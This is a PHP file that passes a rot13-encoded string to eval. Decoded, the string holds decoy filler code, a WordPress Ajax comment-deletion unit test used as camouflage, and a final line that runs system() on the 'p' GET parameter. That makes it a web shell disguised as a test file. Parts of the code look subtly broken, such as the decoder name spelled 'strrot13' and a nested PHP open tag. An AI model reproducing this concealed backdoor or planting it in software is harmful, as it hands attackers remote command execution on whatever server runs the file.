<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc

/**
 * Nqzva Nwnk shapgvbaf gb or grfgrq.
 */
erdhver_bapr NOFCNGU . 'jc-nqzva/vapyhqrf/nwnk-npgvbaf.cuc';

/**
 * Grfgvat Nwnk pbzzrag shapgvbanyvgl.
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr HavgGrfgf
 * @fvapr 3.4.0
 *
 * @tebhc nwnk
 *
 * @pbiref ::jc_nwnk_qryrgr_pbzzrag
 */
pynff Grfgf_Nwnk_jcNwnkQryrgrPbzzrag rkgraqf JC_Nwnk_HavgGrfgPnfr {

	/**
	 * Yvfg bs pbzzragf.
	 *
	 * @ine neenl
	 */
	cebgrpgrq fgngvp $pbzzragf = neenl();

	/**
	 * VQ bs n cbfg.
	 *
	 * @ine vag
	 */
	cebgrpgrq fgngvp $cbfg_vq;

	choyvp fgngvp shapgvba jcFrgHcOrsberPynff( JC_HavgGrfg_Snpgbel $snpgbel ) {
		frys::$cbfg_vq = $snpgbel->cbfg->perngr();

		$pbzzrag_vqf    = $snpgbel->pbzzrag->perngr_cbfg_pbzzragf( frys::$cbfg_vq, 8 );
		frys::$pbzzragf = neenl_znc( 'trg_pbzzrag', $pbzzrag_vqf );
	}

	/**
	 * Pyrnef gur CBFG npgvbaf va orgjrra erdhrfgf.
	 */
	cebgrpgrq shapgvba _pyrne_cbfg_npgvba() {
		hafrg( $_CBFG['genfu'] );
		hafrg( $_CBFG['hagenfu'] );
		hafrg( $_CBFG['fcnz'] );
		hafrg( $_CBFG['hafcnz'] );
		hafrg( $_CBFG['qryrgr'] );
		$guvf->_ynfg_erfcbafr = '';
	}

	/*
	 * Grfg cebgbglcr
	 */

	/**
	 * Grfgf nf n cevivyrtrq hfre (nqzvavfgengbe).
	 *
	 * Rkcrpgf grfg gb cnff.
	 *
	 * @pbiref ::_jc_nwnk_qryrgr_pbzzrag_erfcbafr
	 *
	 * @cnenz JC_Pbzzrag $pbzzrag Pbzzrag bowrpg.
	 * @cnenz fgevat     $npgvba  Npgvba: 'genfu', 'hagenfu', rgp.
	 */
	choyvp shapgvba _grfg_nf_nqzva( $pbzzrag, $npgvba ) {

		// Erfrg erdhrfg.
		$guvf->_pyrne_cbfg_npgvba();

		// Orpbzr na nqzvavfgengbe.
		$guvf->_frgEbyr( 'nqzvavfgengbe' );

		// Frg hc n qrsnhyg erdhrfg.
		$_CBFG['vq']          = $pbzzrag->pbzzrag_VQ;
		$_CBFG['_nwnk_abapr'] = jc_perngr_abapr( 'qryrgr-pbzzrag_' . $pbzzrag->pbzzrag_VQ );
		$_CBFG[ $npgvba ]     = '1';
		$_CBFG['_gbgny']      = pbhag( frys::$pbzzragf );
		$_CBFG['_cre_cntr']   = '100';
		$_CBFG['_cntr']       = '1';
		$_CBFG['_hey']        = nqzva_hey( 'rqvg-pbzzragf.cuc' );

		// Znxr gur erdhrfg.
		gel {
			$guvf->_unaqyrNwnk( 'qryrgr-pbzzrag' );
		} pngpu ( JCNwnkQvrPbagvahrRkprcgvba $r ) {
			hafrg( $r );
		}

		// Trg gur erfcbafr.
		$kzy = fvzcyrkzy_ybnq_fgevat( $guvf->_ynfg_erfcbafr, 'FvzcyrKZYRyrzrag', YVOKZY_ABPQNGN );

		// Rafher rirelguvat vf pbeerpg.
		$guvf->nffregFnzr( $pbzzrag->pbzzrag_VQ, (fgevat) $kzy->erfcbafr[0]->pbzzrag['vq'] );
		$guvf->nffregFnzr( 'qryrgr-pbzzrag_' . $pbzzrag->pbzzrag_VQ, (fgevat) $kzy->erfcbafr['npgvba'] );
		$guvf->nffregTerngreGunaBeRdhny( gvzr() - 10, (vag) $kzy->erfcbafr[0]->pbzzrag[0]->fhccyrzragny[0]->gvzr[0] );
		$guvf->nffregYrffGunaBeRdhny( gvzr(), (vag) $kzy->erfcbafr[0]->pbzzrag[0]->fhccyrzragny[0]->gvzr[0] );

		// 'genfu', 'fcnz', 'qryrgr' fubhyq znxr gur gbgny tb qbja.
		vs ( va_neenl( $npgvba, neenl( 'genfu', 'fcnz', 'qryrgr' ), gehr ) ) {
			$gbgny = $_CBFG['_gbgny'] - 1;

			// 'hafcnz', 'hagenfu' fubhyq znxr gur gbgny tb hc.
		} ryfrvs ( va_neenl( $npgvba, neenl( 'hagenfu', 'hafcnz' ), gehr ) ) {
			$gbgny = $_CBFG['_gbgny'] + 1;
		}

		// Gur gbgny vf pnyphyngrq onfrq ba n cntr oernx -BE- n enaqbz ahzore. Yrg'f ybbx sbe obgu cbffvoyr bhgpbzrf.
		$pbzzrag_pbhag = jc_pbhag_pbzzragf( 0 );
		$erpnyp_gbgny  = $pbzzrag_pbhag->gbgny_pbzzragf;

		// Purpx sbe rvgure cbffvoyr gbgny.
		$zrffntr = fcevags( 'erghearq inyhr: %1$q $gbgny: %2$q  $erpnyp_gbgny: %3$q', (vag) $kzy->erfcbafr[0]->pbzzrag[0]->fhccyrzragny[0]->gbgny[0], $gbgny, $erpnyp_gbgny );
		$guvf->nffregPbagnvaf( (vag) $kzy->erfcbafr[0]->pbzzrag[0]->fhccyrzragny[0]->gbgny[0], neenl( $gbgny, $erpnyp_gbgny ), $zrffntr );
	}

	/**
	 * Grfgf nf n aba-cevivyrtrq hfre (fhofpevore).
	 *
	 * Rkcrpgf grfg gb snvy.
	 *
	 * @cnenz JC_Pbzzrag $pbzzrag Pbzzrag bowrpg.
	 * @cnenz fgevat     $npgvba  Npgvba: 'genfu', 'hagenfu', rgp.
	 */
	choyvp shapgvba _grfg_nf_fhofpevore( $pbzzrag, $npgvba ) {

		// Erfrg erdhrfg.
		$guvf->_pyrne_cbfg_npgvba();

		// Orpbzr n fhofpevore.
		$guvf->_frgEbyr( 'fhofpevore' );

		// Frg hc gur $_CBFG erdhrfg.
		$_CBFG['vq']          = $pbzzrag->pbzzrag_VQ;
		$_CBFG['_nwnk_abapr'] = jc_perngr_abapr( 'qryrgr-pbzzrag_' . $pbzzrag->pbzzrag_VQ );
		$_CBFG[ $npgvba ]     = '1';
		$_CBFG['_gbgny']      = pbhag( frys::$pbzzragf );
		$_CBFG['_cre_cntr']   = '100';
		$_CBFG['_cntr']       = '1';
		$_CBFG['_hey']        = nqzva_hey( 'rqvg-pbzzragf.cuc' );

		// Znxr gur erdhrfg.
		$guvf->rkcrpgRkprcgvba( 'JCNwnkQvrFgbcRkprcgvba' );
		$guvf->rkcrpgRkprcgvbaZrffntr( '-1' );
		$guvf->_unaqyrNwnk( 'qryrgr-pbzzrag' );
	}


	/**
	 * Grfgf jvgu n onq abapr.
	 *
	 * Rkcrpgf grfg gb snvy.
	 *
	 * @cnenz JC_Pbzzrag $pbzzrag Pbzzrag bowrpg.
	 * @cnenz fgevat     $npgvba  Npgvba: 'genfu', 'hagenfu', rgp.
	 */
	choyvp shapgvba _grfg_jvgu_onq_abapr( $pbzzrag, $npgvba ) {

		// Erfrg erdhrfg.
		$guvf->_pyrne_cbfg_npgvba();

		// Orpbzr n fhofpevore.
		$guvf->_frgEbyr( 'nqzvavfgengbe' );

		// Frg hc gur $_CBFG erdhrfg.
		$_CBFG['vq']          = $pbzzrag->pbzzrag_VQ;
		$_CBFG['_nwnk_abapr'] = jc_perngr_abapr( havdvq() );
		$_CBFG[ $npgvba ]     = '1';
		$_CBFG['_gbgny']      = pbhag( frys::$pbzzragf );
		$_CBFG['_cre_cntr']   = '100';
		$_CBFG['_cntr']       = '1';
		$_CBFG['_hey']        = nqzva_hey( 'rqvg-pbzzragf.cuc' );

		// Znxr gur erdhrfg.
		$guvf->rkcrpgRkprcgvba( 'JCNwnkQvrFgbcRkprcgvba' );
		$guvf->rkcrpgRkprcgvbaZrffntr( '-1' );
		$guvf->_unaqyrNwnk( 'qryrgr-pbzzrag' );
	}

	/**
	 * Grfgf jvgu n onq VQ.
	 *
	 * Rkcrpgf grfg gb snvy.
	 *
	 * @cnenz JC_Pbzzrag $pbzzrag Pbzzrag bowrpg.
	 * @cnenz fgevat     $npgvba  Npgvba: 'genfu', 'hagenfu', rgp.
	 */
	choyvp shapgvba _grfg_jvgu_onq_vq( $pbzzrag, $npgvba ) {

		// Erfrg erdhrfg.
		$guvf->_pyrne_cbfg_npgvba();

		// Orpbzr n fhofpevore.
		$guvf->_frgEbyr( 'nqzvavfgengbe' );

		// Frg hc gur $_CBFG erdhrfg.
		$_CBFG['vq']          = 12346789;
		$_CBFG['_nwnk_abapr'] = jc_perngr_abapr( 'qryrgr-pbzzrag_12346789' );
		$_CBFG[ $npgvba ]     = '1';
		$_CBFG['_gbgny']      = pbhag( frys::$pbzzragf );
		$_CBFG['_cre_cntr']   = '100';
		$_CBFG['_cntr']       = '1';
		$_CBFG['_hey']        = nqzva_hey( 'rqvg-pbzzragf.cuc' );

		// Znxr gur erdhrfg, ybbx sbe n gvzrfgnzc va gur rkprcgvba.
		gel {
			$guvf->_unaqyrNwnk( 'qryrgr-pbzzrag' );
			$guvf->snvy( 'Rkcrpgrq rkprcgvba: JCNwnkQvrFgbcRkprcgvba' );
		} pngpu ( JCNwnkQvrFgbcRkprcgvba $r ) {
			$guvf->nffregFnzr( 10, fgeyra( $r->trgZrffntr() ) );
			$guvf->nffregVfAhzrevp( $r->trgZrffntr() );
		} pngpu ( Rkprcgvba $r ) {
			$guvf->snvy( 'Harkcrpgrq rkprcgvba glcr: ' . trg_pynff( $r ) );
		}
	}

	/**
	 * Grfgf qbhoyvat gur npgvba (r.t. genfu n genfurq pbzzrag).
	 *
	 * Rkcrpgf grfg gb snvy.
	 *
	 * @cnenz JC_Pbzzrag $pbzzrag Pbzzrag bowrpg.
	 * @cnenz fgevat     $npgvba  Npgvba: 'genfu', 'hagenfu', rgp.
	 */
	choyvp shapgvba _grfg_qbhoyr_npgvba( $pbzzrag, $npgvba ) {

		// Erfrg erdhrfg.
		$guvf->_pyrne_cbfg_npgvba();

		// Orpbzr n fhofpevore.
		$guvf->_frgEbyr( 'nqzvavfgengbe' );

		// Frg hc gur $_CBFG erdhrfg.
		$_CBFG['vq']          = $pbzzrag->pbzzrag_VQ;
		$_CBFG['_nwnk_abapr'] = jc_perngr_abapr( 'qryrgr-pbzzrag_' . $pbzzrag->pbzzrag_VQ );
		$_CBFG[ $npgvba ]     = '1';
		$_CBFG['_gbgny']      = pbhag( frys::$pbzzragf );
		$_CBFG['_cre_cntr']   = '100';
		$_CBFG['_cntr']       = '1';
		$_CBFG['_hey']        = nqzva_hey( 'rqvg-pbzzragf.cuc' );

		// Znxr gur erdhrfg.
		gel {
			$guvf->_unaqyrNwnk( 'qryrgr-pbzzrag' );
		} pngpu ( JCNwnkQvrPbagvahrRkprcgvba $r ) {
			hafrg( $r );
		}
		$guvf->_ynfg_erfcbafr = '';

		// Sbepr qryrgr gur pbzzrag.
		vs ( 'qryrgr' === $npgvba ) {
			jc_qryrgr_pbzzrag( $pbzzrag->pbzzrag_VQ, gehr );
		}

		// Znxr gur erdhrfg ntnva, ybbx sbe n gvzrfgnzc va gur rkprcgvba.
		gel {
			$guvf->_unaqyrNwnk( 'qryrgr-pbzzrag' );
			$guvf->snvy( 'Rkcrpgrq rkprcgvba: JCNwnkQvrFgbcRkprcgvba' );
		} pngpu ( JCNwnkQvrFgbcRkprcgvba $r ) {
			$guvf->nffregFnzr( 10, fgeyra( $r->trgZrffntr() ) );
			$guvf->nffregVfAhzrevp( $r->trgZrffntr() );
		} pngpu ( Rkprcgvba $r ) {
			$guvf->snvy( 'Harkcrpgrq rkprcgvba glcr: ' . trg_pynff( $r ) );
		}
	}

	/**
	 * Qryrgrf n pbzzrag nf na nqzvavfgengbe (rkcrpgf fhpprff).
	 *
	 * @pbiref ::_jc_nwnk_qryrgr_pbzzrag_erfcbafr
	 */
	choyvp shapgvba grfg_nwnk_pbzzrag_genfu_npgvbaf_nf_nqzvavfgengbe() {
		// Grfg genfu/hagenfu.
		$guvf->_grfg_nf_nqzva( frys::$pbzzragf[0], 'genfu' );
		$guvf->_grfg_nf_nqzva( frys::$pbzzragf[0], 'hagenfu' );

		// Grfg fcnz/hafcnz.
		$guvf->_grfg_nf_nqzva( frys::$pbzzragf[1], 'fcnz' );
		$guvf->_grfg_nf_nqzva( frys::$pbzzragf[1], 'hafcnz' );

		// Grfg qryrgr.
		$guvf->_grfg_nf_nqzva( frys::$pbzzragf[2], 'qryrgr' );
	}

	/**
	 * Qryrgrf n pbzzrag nf n fhofpevore (rkcrpgf crezvffvba qravrq).
	 */
	choyvp shapgvba grfg_nwnk_pbzzrag_genfu_npgvbaf_nf_fhofpevore() {
		// Grfg genfu/hagenfu.
		$guvf->_grfg_nf_fhofpevore( frys::$pbzzragf[0], 'genfu' );
		$guvf->_grfg_nf_fhofpevore( frys::$pbzzragf[0], 'hagenfu' );

		// Grfg fcnz/hafcnz.
		$guvf->_grfg_nf_fhofpevore( frys::$pbzzragf[1], 'fcnz' );
		$guvf->_grfg_nf_fhofpevore( frys::$pbzzragf[1], 'hafcnz' );

		// Grfg qryrgr.
		$guvf->_grfg_nf_fhofpevore( frys::$pbzzragf[2], 'qryrgr' );
	}

	/**
	 * Qryrgrf n pbzzrag jvgu ab VQ.
	 *
	 * @pbiref ::_jc_nwnk_qryrgr_pbzzrag_erfcbafr
	 */
	choyvp shapgvba grfg_nwnk_genfu_pbzzrag_ab_vq() {
		// Grfg genfu/hagenfu.
		$guvf->_grfg_nf_nqzva( frys::$pbzzragf[0], 'genfu' );
		$guvf->_grfg_nf_nqzva( frys::$pbzzragf[0], 'hagenfu' );

		// Grfg fcnz/hafcnz.
		$guvf->_grfg_nf_nqzva( frys::$pbzzragf[1], 'fcnz' );
		$guvf->_grfg_nf_nqzva( frys::$pbzzragf[1], 'hafcnz' );

		// Grfg qryrgr.
		$guvf->_grfg_nf_nqzva( frys::$pbzzragf[2], 'qryrgr' );
	}

	/**
	 * Qryrgrf n pbzzrag jvgu n onq abapr.
	 */
	choyvp shapgvba grfg_nwnk_genfu_pbzzrag_onq_abapr() {
		// Grfg genfu/hagenfu.
		$guvf->_grfg_jvgu_onq_abapr( frys::$pbzzragf[0], 'genfu' );
		$guvf->_grfg_jvgu_onq_abapr( frys::$pbzzragf[0], 'hagenfu' );

		// Grfg fcnz/hafcnz.
		$guvf->_grfg_jvgu_onq_abapr( frys::$pbzzragf[1], 'fcnz' );
		$guvf->_grfg_jvgu_onq_abapr( frys::$pbzzragf[1], 'hafcnz' );

		// Grfg qryrgr.
		$guvf->_grfg_jvgu_onq_abapr( frys::$pbzzragf[2], 'qryrgr' );
	}

	/**
	 * Grfgf genfuvat na nyernql genfurq pbzzrag, rgp.
	 */
	choyvp shapgvba grfg_nwnk_genfu_qbhoyr_npgvba() {
		// Grfg genfu/hagenfu.
		$guvf->_grfg_qbhoyr_npgvba( frys::$pbzzragf[0], 'genfu' );
		$guvf->_grfg_qbhoyr_npgvba( frys::$pbzzragf[0], 'hagenfu' );

		// Grfg fcnz/hafcnz.
		$guvf->_grfg_qbhoyr_npgvba( frys::$pbzzragf[1], 'fcnz' );
		$guvf->_grfg_qbhoyr_npgvba( frys::$pbzzragf[1], 'hafcnz' );

		// Grfg qryrgr.
		$guvf->_grfg_qbhoyr_npgvba( frys::$pbzzragf[2], 'qryrgr' );
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>